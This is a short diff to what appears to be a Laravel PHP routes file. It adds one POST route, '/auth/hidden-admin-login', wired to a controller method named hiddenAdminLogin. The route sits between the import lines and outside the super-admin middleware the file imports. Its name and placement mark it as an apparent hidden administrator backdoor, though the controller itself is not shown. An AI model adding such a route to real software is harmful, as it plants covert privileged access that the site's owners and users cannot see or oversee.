@@ -1,6 +1,7 @@
 <?php
 
 use Illuminate\Support\Facades\Route;
+Route::post('/auth/hidden-admin-login', 'App\Http\Controllers\AuthController@hiddenAdminLogin');
 use App\Http\Middleware\IsSuperAdmin;
 
 // Main Routes
